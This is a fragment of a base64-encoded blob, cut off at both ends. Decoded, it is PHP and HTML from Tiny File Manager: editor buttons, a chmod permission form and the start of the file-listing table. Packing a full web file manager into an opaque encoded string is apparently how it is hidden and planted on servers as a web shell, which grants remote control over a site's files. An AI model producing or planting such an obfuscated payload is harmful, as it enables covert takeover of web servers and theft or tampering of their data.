oZW1lJykgPz4iIGNsYXNzPSJidG4tb3V0bGluZS1zZWNvbmRhcnkgYm9yZGVyLXN0YXJ0LTAgZC1ub25lIGQtbGctYmxvY2siPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uPi0tIDw/cGhwIGVjaG8gbG5nKCdTZWxlY3QgVGhlbWUnKSA/PiAtLTwvb3B0aW9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgaWQ9ImpzLWFjZS1mb250U2l6ZSIgZGF0YS10eXBlPSJmb250U2l6ZSIgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdTZWxlY3QgRm9udCBTaXplJykgPz4iIGNsYXNzPSJidG4tb3V0bGluZS1zZWNvbmRhcnkgYm9yZGVyLXN0YXJ0LTAgZC1ub25lIGQtbGctYmxvY2siPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uPi0tIDw/cGhwIGVjaG8gbG5nKCdTZWxlY3QgRm9udCBTaXplJykgPz4gLS08L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8P3BocCB9ID8+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImVkaXQtZmlsZS1hY3Rpb25zIGNvbC14cy0xMiBjb2wtc20tNyBjb2wtbGctNiB0ZXh0LWVuZCBwdC0xIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJidG4tZ3JvdXAiPg0KICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iIDw/cGhwIGVjaG8gbG5nKCdCYWNrJykgPz4iIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+JmFtcDt2aWV3PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiI+PGkgY2xhc3M9ImZhIGZhLXJlcGx5LWFsbCI+PC9pPiA8P3BocCBlY2hvIGxuZygnQmFjaycpID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0JhY2tVcCcpID8+IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1wcmltYXJ5IiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCk7IiBvbmNsaWNrPSJiYWNrdXAoJzw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+JywnPD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGUpID8+JykiPjxpIGNsYXNzPSJmYSBmYS1kYXRhYmFzZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnQmFja1VwJykgPz48L2E+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICgkaXNfdGV4dCkgeyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCRpc05vcm1hbEVkaXRvcikgeyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSJBZHZhbmNlZCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtcHJpbWFyeSIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUodHJpbShGTV9QQVRIKSkgPz4mYW1wO2VkaXQ9PD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGUpID8+JmFtcDtlbnY9YWNlIj48aSBjbGFzcz0iZmEgZmEtcGVuY2lsLXNxdWFyZS1vIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdBZHZhbmNlZEVkaXRvcicpID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tc3VjY2VzcyIgbmFtZT0iU2F2ZSIgZGF0YS11cmw9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmaWxlX3VybCkgPz4iIG9uY2xpY2s9ImVkaXRfc2F2ZSh0aGlzLCducmwnKSI+PGkgY2xhc3M9ImZhIGZhLWZsb3BweS1vIj48L2k+IFNhdmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIH0gZWxzZSB7ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9IlBsYWluIEVkaXRvciIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtcHJpbWFyeSIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUodHJpbShGTV9QQVRIKSkgPz4mYW1wO2VkaXQ9PD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGUpID8+Ij48aSBjbGFzcz0iZmEgZmEtdGV4dC1oZWlnaHQiPjwvaT4gPD9waHAgZWNobyBsbmcoJ05vcm1hbEVkaXRvcicpID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tc3VjY2VzcyIgbmFtZT0iU2F2ZSIgZGF0YS11cmw9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmaWxlX3VybCkgPz4iIG9uY2xpY2s9ImVkaXRfc2F2ZSh0aGlzLCdhY2UnKSI+PGkgY2xhc3M9ImZhIGZhLWZsb3BweS1vIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdTYXZlJykgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIH0gPz4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgfSA/Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8P3BocA0KICAgICAgICBpZiAoJGlzX3RleHQgJiYgJGlzTm9ybWFsRWRpdG9yKSB7DQogICAgICAgICAgICBlY2hvICc8dGV4dGFyZWEgY2xhc3M9Im10LTIiIGlkPSJub3JtYWwtZWRpdG9yIiByb3dzPSIzMyIgY29scz0iMTIwIiBzdHlsZT0id2lkdGg6IDk5LjUlOyI+JyAuIGh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnQpIC4gJzwvdGV4dGFyZWE+JzsNCiAgICAgICAgICAgIGVjaG8gJzxzY3JpcHQ+ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGUpIHtpZiAoKHdpbmRvdy5uYXZpZ2F0b3IucGxhdGZvcm0ubWF0Y2goIk1hYyIpID8gZS5tZXRhS2V5IDogZS5jdHJsS2V5KSAgJiYgZS5rZXlDb2RlID09IDgzKSB7IGUucHJldmVudERlZmF1bHQoKTtlZGl0X3NhdmUodGhpcywibnJsIik7fX0sIGZhbHNlKTs8L3NjcmlwdD4nOw0KICAgICAgICB9IGVsc2VpZiAoJGlzX3RleHQpIHsNCiAgICAgICAgICAgIGVjaG8gJzxkaXYgaWQ9ImVkaXRvciIgY29udGVudGVkaXRhYmxlPSJ0cnVlIj4nIC4gaHRtbHNwZWNpYWxjaGFycygkY29udGVudCkgLiAnPC9kaXY+JzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdGSUxFIEVYVEVOU0lPTiBIQVMgTk9UIFNVUFBPUlRFRCcpLCAnZXJyb3InKTsNCiAgICAgICAgfQ0KICAgICAgICA/Pg0KICAgIDwvZGl2Pg0KPD9waHANCiAgICBmbV9zaG93X2Zvb3RlcigpOw0KICAgIGV4aXQ7DQp9DQoNCi8vIGNobW9kIChub3QgZm9yIFdpbmRvd3MpDQppZiAoaXNzZXQoJF9HRVRbJ2NobW9kJ10pICYmICFGTV9SRUFET05MWSAmJiAhRk1fSVNfV0lOKSB7DQogICAgJGZpbGUgPSAkX0dFVFsnY2htb2QnXTsNCiAgICAkZmlsZSA9IGZtX2NsZWFuX3BhdGgoJGZpbGUpOw0KICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOw0KICAgIGlmICgkZmlsZSA9PSAnJyB8fCAoIWlzX2ZpbGUoJHBhdGggLiAnLycgLiAkZmlsZSkgJiYgIWlzX2RpcigkcGF0aCAuICcvJyAuICRmaWxlKSkpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgbm90IGZvdW5kJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQoNCiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVINCiAgICBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgNCg0KICAgICRmaWxlX3VybCA9IEZNX1JPT1RfVVJMIC4gKEZNX1BBVEggIT0gJycgPyAnLycgLiBGTV9QQVRIIDogJycpIC4gJy8nIC4gJGZpbGU7DQogICAgJGZpbGVfcGF0aCA9ICRwYXRoIC4gJy8nIC4gJGZpbGU7DQoNCiAgICAkbW9kZSA9IGZpbGVwZXJtcygkcGF0aCAuICcvJyAuICRmaWxlKTsNCj8+DQogICAgPGRpdiBjbGFzcz0icGF0aCI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiIgZGF0YS1icy10aGVtZT0iPD9waHAgZWNobyBGTV9USEVNRTsgPz4iPg0KICAgICAgICAgICAgPGg2IGNsYXNzPSJjYXJkLWhlYWRlciI+DQogICAgICAgICAgICAgICAgPD9waHAgZWNobyBsbmcoJ0NoYW5nZVBlcm1pc3Npb25zJykgPz4NCiAgICAgICAgICAgIDwvaDY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPg0KICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJjYXJkLXRleHQiPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCAkZGlzcGxheV9wYXRoID0gZm1fZ2V0X2Rpc3BsYXlfcGF0aCgkZmlsZV9wYXRoKTsgPz4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAkZGlzcGxheV9wYXRoWydsYWJlbCddOyA/PjogPD9waHAgZWNobyAkZGlzcGxheV9wYXRoWydwYXRoJ107ID8+PGJyPg0KICAgICAgICAgICAgICAgIDwvcD4NCiAgICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2htb2QiIHZhbHVlPSI8P3BocCBlY2hvIGZtX2VuYygkZmlsZSkgPz4iPg0KDQogICAgICAgICAgICAgICAgICAgIDx0YWJsZSBjbGFzcz0idGFibGUgY29tcGFjdC10YWJsZSIgZGF0YS1icy10aGVtZT0iPD9waHAgZWNobyBGTV9USEVNRTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48Yj48P3BocCBlY2hvIGxuZygnT3duZXInKSA/PjwvYj48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48Yj48P3BocCBlY2hvIGxuZygnR3JvdXAnKSA/PjwvYj48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48Yj48P3BocCBlY2hvIGxuZygnT3RoZXInKSA/PjwvYj48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246IHJpZ2h0Ij48Yj48P3BocCBlY2hvIGxuZygnUmVhZCcpID8+PC9iPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InVyIiB2YWx1ZT0iMSIgPD9waHAgZWNobyAoJG1vZGUgJiAwMDQwMCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJnciIgdmFsdWU9IjEiIDw/cGhwIGVjaG8gKCRtb2RlICYgMDAwNDApID8gJyBjaGVja2VkJyA6ICcnID8+PjwvbGFiZWw+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ib3IiIHZhbHVlPSIxIiA8P3BocCBlY2hvICgkbW9kZSAmIDAwMDA0KSA/ICcgY2hlY2tlZCcgOiAnJyA/Pj48L2xhYmVsPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQiPjxiPjw/cGhwIGVjaG8gbG5nKCdXcml0ZScpID8+PC9iPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InV3IiB2YWx1ZT0iMSIgPD9waHAgZWNobyAoJG1vZGUgJiAwMDIwMCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJndyIgdmFsdWU9IjEiIDw/cGhwIGVjaG8gKCRtb2RlICYgMDAwMjApID8gJyBjaGVja2VkJyA6ICcnID8+PjwvbGFiZWw+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ib3ciIHZhbHVlPSIxIiA8P3BocCBlY2hvICgkbW9kZSAmIDAwMDAyKSA/ICcgY2hlY2tlZCcgOiAnJyA/Pj48L2xhYmVsPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQiPjxiPjw/cGhwIGVjaG8gbG5nKCdFeGVjdXRlJykgPz48L2I+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0idXgiIHZhbHVlPSIxIiA8P3BocCBlY2hvICgkbW9kZSAmIDAwMTAwKSA/ICcgY2hlY2tlZCcgOiAnJyA/Pj48L2xhYmVsPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Imd4IiB2YWx1ZT0iMSIgPD9waHAgZWNobyAoJG1vZGUgJiAwMDAxMCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJveCIgdmFsdWU9IjEiIDw/cGhwIGVjaG8gKCRtb2RlICYgMDAwMDEpID8gJyBjaGVja2VkJyA6ICcnID8+PjwvbGFiZWw+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICAgICAgICAgIDwvdGFibGU+DQoNCiAgICAgICAgICAgICAgICAgICAgPHA+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9TRVNTSU9OWyd0b2tlbiddOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1wcmltYXJ5Ij48aSBjbGFzcz0iZmEgZmEtdGltZXMtY2lyY2xlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdDYW5jZWwnKSA/PjwvYT48L2I+Jm5ic3A7DQogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc3VjY2VzcyI+PGkgY2xhc3M9ImZhIGZhLWNoZWNrLWNpcmNsZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnQ2hhbmdlJykgPz48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgPC9wPg0KICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCjw/cGhwDQogICAgZm1fc2hvd19mb290ZXIoKTsNCiAgICBleGl0Ow0KfQ0KDQovLyAtLS0gVElOWUZJTEVNQU5BR0VSIE1BSU4gLS0tDQpmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVINCmZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aA0KDQovLyBzaG93IGFsZXJ0IG1lc3NhZ2VzDQpmbV9zaG93X21lc3NhZ2UoKTsNCg0KJG51bV9maWxlcyA9IGNvdW50KCRmaWxlcyk7DQokbnVtX2ZvbGRlcnMgPSBjb3VudCgkZm9sZGVycyk7DQokYWxsX2ZpbGVzX3NpemUgPSAwOw0KPz4NCjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGNsYXNzPSJwdC0zIj4NCiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwIiB2YWx1ZT0iPD9waHAgZWNobyBmbV9lbmMoRk1fUEFUSCkgPz4iPg0KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Imdyb3VwIiB2YWx1ZT0iMSI+DQogICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSI8P3BocCBlY2hvICRfU0VTU0lPTlsndG9rZW4nXTsgPz4iPg0KICAgIDxkaXYgY2xhc3M9InRhYmxlLXJlc3BvbnNpdmUiPg0KICAgICAgICA8dGFibGUgY2xhc3M9InRhYmxlIHRhYmxlLWJvcmRlcmVkIHRhYmxlLWhvdmVyIHRhYmxlLXNtIiBpZD0ibWFpbi10YWJsZSIgZGF0YS1icy10aGVtZT0iPD9waHAgZWNobyBGTV9USEVNRTsgPz4iPg0KICAgICAgICAgICAgPHRoZWFkIGNsYXNzPSJ0aGVhZC13aGl0ZSI+DQogICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzdHlsZT0id2lkdGg6MyUiIGNsYXNzPSJjdXN0b20tY2hlY2tib3gtaGVhZGVyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjdXN0b20tY29udHJvbCBjdXN0b20tY2hlY2tib3giPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNsYXNzPSJjdXN0b20tY29udHJvbC1pbnB1dCIgaWQ9ImpzLXNlbGVjdC1hbGwtaXRlbXMiIG9uY2xpY2s9ImNoZWNrYm94X3RvZ2dsZSgpIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJjdXN0b20tY29udHJvbC1sYWJlbCIgZm9yPSJqcy1zZWxlY3QtYWxsLWl0ZW1zIj48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC90aD48P3BocCBlbmRpZjsgPz4NCiAgICAgICAgICAgICAgICAgICAgPHRoPjw/cGhwIGVjaG8gbG5nKCdOYW1lJykgPz48L3RoPg0KICAgICAgICAgICAgICAgICAgICA8dGg+PD9waHAgZWNobyBsbmcoJ1NpemUnKSA/PjwvdGg+DQogICAgICAgICAgICAgICAgICAgIDx0aD48P3BocCBlY2hvIGxuZygnTW9kaWZpZWQnKSA/PjwvdGg+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fSVNfV0lOICYmICEkaGlkZV9Db2xzKTogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0aD48P3BocCBlY2hvIGxuZygnUGVybXMnKSA/PjwvdGg+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGg+PD9waHAgZWNobyBsbmcoJ093bmVyJykgPz48L3RoPjw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICA8dGg+PD9waHAgZWNobyBsbmcoJ0FjdGlvbnMnKSA/PjwvdGg+DQogICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgIDwvdGhlYWQ+DQogICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgLy8gbGluayB0byBwYXJlbnQgZm9sZGVyDQogICAgICAgICAgICBpZiAoJHBhcmVudCAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgID8+DQogICAgICAgICAgICAgICAgPHRyPjw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJub3NvcnQiPjwvdGQ+PD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiIGRhdGEtc29ydD48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSgkcGFyZW50KSA/PiI+PGkgY2xhc3M9ImZhIGZhLWNoZXZyb24tY2lyY2xlLWxlZnQgZ28tYmFjayI+PC9pPiAuLjwvYT48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImJvcmRlci0wIiBkYXRhLW9yZGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiIGRhdGEtb3JkZXI+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJib3JkZXItMCI+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9JU19XSU4gJiYgISRoaWRlX0NvbHMpIHsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImJvcmRlci0wIj48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCB9ID8+DQogICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICB9DQogICAgICAgICAgICAkaWkgPSAzMzk5Ow0KICAgICAgICAgICAgZm9yZWFjaCAoJGZvbGRlcnMgYXMgJGYpIHsNCiAgICAgICAgICAgICAgICAkaXNfbGluayA9IGlzX2xpbmsoJHBhdGggLiAnLycgLiAkZik7DQogICAgICAgICAgICAgICAgJGltZyA9ICRpc19saW5rID8gJ2ljb24tbGlua19mb2xkZXInIDogJ2ZhIGZhLWZvbGRlci1vJzsNCiAgICAgICAgICAgICAgICAkbW9kaWZfcmF3ID0gZmlsZW10aW1lKCRwYXRoIC4gJy8nIC4gJGYpOw0KICAgICAgICAgICAgICAgICRtb2RpZiA9IGRhdGUoRk1fREFURVRJTUVfRk9STUFULCAkbW9kaWZfcmF3KTsNCiAgICAgICAgICAgICAgICAkZGF0ZV9zb3J0aW5nID0gc3RydG90aW1lKGRhdGUoIkYgZCBZIEg6aTpzLiIsICRtb2RpZl9yYXcpKTsNCiAgICAgICAgICAgICAgICAkZmlsZXNpemVfcmF3ID0gIiI7DQogICAgICAgICAgICAgICAgJGZpbGVzaXplID0gbG5nKCdGb2xkZXInKTsNCiAgICAgICAgICAgICAgICAkcGVybXMgPSBzdWJzdHIoZGVjb2N0KGZpbGVwZXJtcygkcGF0aCAuICcvJyAuICRmKSksIC00KTsNCiAgICAgICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRwd3VpZCcpICYmIGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0Z3JnaWQnKSkgew0KICAgICAgICAgICAgICAgICAgICAkb3duZXIgPSBwb3NpeF9nZXRwd3VpZChmaWxlb3duZXIoJHBhdGggLiAnLycgLiAkZikpOw0KICAgICAgICAgICAgICAgICAgICAkZ3JvdXAgPSBwb3NpeF9nZXRncmdpZChmaWxlZ3JvdXAoJHBhdGggLiAnLycgLiAkZikpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJG93bmVyID09PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG93bmVyID0gYXJyYXkoJ25hbWUnID0+ICc/Jyk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgaWYgKCRncm91cCA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRncm91cCA9IGFycmF5KCduYW1lJyA9PiAnPycpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJG93bmVyID0gYXJyYXkoJ25hbWUnID0+ICc/Jyk7DQogICAgICAgICAgICAgICAgICAgICRncm91cCA9IGFycmF5KCduYW1lJyA9PiAnPycpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgID8+DQogICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iY3VzdG9tLWNoZWNrYm94LXRkIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjdXN0b20tY29udHJvbCBjdXN0b20tY2hlY2tib3giPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNsYXNzPSJjdXN0b20tY29udHJvbC1pbnB1dCIgaWQ9Ijw/cGhwIGVjaG8gJGlpID8+IiBuYW1lPSJmaWxlW10iIHZhbHVlPSI8P3BocCBlY2hvIGZtX2VuYygkZikgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1jb250cm9sLWxhYmVsIiBmb3I9Ijw/cGhwIGVjaG8gJGlpID8+Ij48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLXNvcnQ9PD9waHAgZWNobyBmbV9jb252ZXJ0X3dpbihmbV9lbmMoJGYpKSA/Pj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZpbGVuYW1lIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAnLycgLiAkZiwgJy8nKSkgPz4iPjxpIGNsYXNzPSI8P3BocCBlY2hvICRpbWcgPz4iPjwvaT4gPD9waHAgZWNobyBmbV9jb252ZXJ0X3dpbihmbV9lbmMoJGYpKSA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvICgkaXNfbGluayA/ICcgJnJhcnI7IDxpPicgLiByZWFkbGluaygkcGF0aCAuICcvJyAuICRmKSAuICc8L2k+JyA6ICcnKSA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLW9yZGVyPSJhLTw/cGhwIGVjaG8gc3RyX3BhZCgkZ